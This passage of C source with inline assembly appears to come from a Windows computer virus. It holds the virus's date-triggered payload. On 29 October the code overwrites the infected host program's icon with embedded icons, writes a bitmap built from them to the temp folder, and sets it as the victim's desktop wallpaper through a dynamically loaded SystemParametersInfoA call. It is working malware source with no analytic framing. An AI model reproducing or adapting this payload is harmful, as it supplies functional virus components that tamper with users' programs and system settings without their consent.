     {
       SYSTEMTIME SystemTime;
       GetLocalTime(&SystemTime);
       if ((BYTE)SystemTime.wDay == 29 && (BYTE)SystemTime.wMonth == 0xA) {
         bPayLoadDay = TRUE;
         #ifdef compr
         jq_decode(HostLargeIcon + SIZEOF_ICONS,
                   jq29aComprIcons + SIZEOF_COMPR_ICONS,
                   SIZEOF_COMPR_ICONS,
                   ComprMem);
         {
         HANDLE hBmp;
         DWORD cBytes;
         if ((cBytes = GetTempPath(MAX_PATH, PathName)) - 1 < MAX_PATH - 1) {
           if (PathName[cBytes - 1] != '\\')
             PathName[cBytes++] = '\\';
           *(PDWORD)(PathName + cBytes) = '.A92';
           *(PDWORD)(PathName + cBytes + 4) = 'PMB';
           hBmp = CreateFile(PathName, GENERIC_WRITE, 0, NULL, OPEN_ALWAYS,
                             FILE_ATTRIBUTE_NORMAL, 0);
           if (hBmp != INVALID_HANDLE_VALUE)
           if (GetFileSize(hBmp, NULL) == SIZEOF_BMP) {
             CloseHandle(hBmp);
             goto SetDeskWallPaper;
           }
           else {
             {
               PBYTE pSrc = HostLargeIcon;
               PBYTE pTgt = jq29aBmp + 0xE;
               DWORD nCount = 0x68;
               *(PDWORD)(pTgt - 0xE) = 0x80764D42;
               pTgt[0xA - 0xE] = 0x76;
               do *pTgt++ = *pSrc++; while (--nCount);
               ((PBITMAPINFOHEADER)(pTgt - 0x68))->biWidth = 0x100;
               ((PBITMAPINFOHEADER)(pTgt - 0x68))->biHeight = 0x100;
               *((PBYTE)&((PBITMAPINFOHEADER)(pTgt - 0x68))->biSizeImage + 1)
                 = 0x80;
               *(PWORD)&((PBITMAPINFOHEADER)(pTgt - 0x68))->biXPelsPerMeter
                 = 0xECE;
               *(PWORD)&((PBITMAPINFOHEADER)(pTgt - 0x68))->biYPelsPerMeter
                 = 0xED8;
               pSrc += 0x200;
               {
                 DWORD nCountDwords = 32;
                 do {
                   DWORD nCountYPels = 8;
                   DWORD Pix = *((PDWORD)pSrc)++;
                   __asm {
                     mov eax, [Pix]
                     xchg ah, al
                     rol eax, 16
                     xchg ah, al
                     mov [Pix], eax
                   }
                   do {
                     DWORD PixCopy = Pix;
                     DWORD nCountBits = 32;
                     do {
                       DWORD nCountXPels = 4;
                       do {
                         *pTgt++ = (PixCopy & 0x80000000)? 0x66 : 0;
                       } while (--nCountXPels); PixCopy <<= 1;
                     } while (--nCountBits);
                   } while (--nCountYPels);
                 } while (--nCountDwords);
               }
             }
             {
               BOOL bBool = WriteFile(hBmp, jq29aBmp, SIZEOF_BMP, &cBytes,
                                      NULL);
               WriteFile(hBmp, jq29aBmp, 0, &cBytes, NULL);
               CloseHandle(hBmp);
               if (bBool) {
                 HINSTANCE hInst;
                SetDeskWallPaper:
                 hInst = LoadLibrary("USER32");
                 if (hInst) {
                   DWORD (WINAPI *pfnSystemParametersInfo)(DWORD, DWORD,
                                                           PVOID, DWORD);
                   pfnSystemParametersInfo =
                     (DWORD (WINAPI *)(DWORD, DWORD, PVOID, DWORD))
                       GetProcAddress(hInst, "SystemParametersInfoA");
                   if (pfnSystemParametersInfo)
                     pfnSystemParametersInfo(SPI_SETDESKWALLPAPER,
                                             0,
                                             PathName,
                                             SPIF_UPDATEINIFILE);
                   FreeLibrary(hInst);
                 }
               }
             }
           }
         }
         }
         #else
         {
           PBYTE pTgt = HostLargeIcon;
           PBYTE pSrc = jq29aIcons;
           DWORD nCount = SIZEOF_ICONS;
           do *pTgt++ = *pSrc++ while (--nCount);
         }
         #endif
       }
     }
